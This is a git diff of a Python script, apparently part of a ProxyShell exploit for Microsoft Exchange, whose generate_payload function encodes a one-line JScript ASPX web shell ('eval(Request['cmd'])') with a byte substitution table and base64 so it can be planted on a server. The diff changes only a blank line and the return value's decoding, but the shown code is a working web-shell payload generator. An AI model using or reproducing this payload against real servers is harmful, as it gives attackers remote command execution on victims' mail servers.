@@ -105,6 +105,7 @@ mpbbcrypt = [
 
 def generate_payload():
     # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py#L175
+
     payload = "<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>"
     compEnc = [0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
                0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
@@ -127,7 +128,7 @@ def generate_payload():
         temp = ord(payload[i]) & 0xff
         out[i] = "%02x" % (compEnc[temp])
     out = ''.join(out)
-    return base64.b64encode(binascii.unhexlify(out)).decode("utf-8")
+    return base64.b64encode(binascii.unhexlify(out))
 
 
 print (generate_payload())
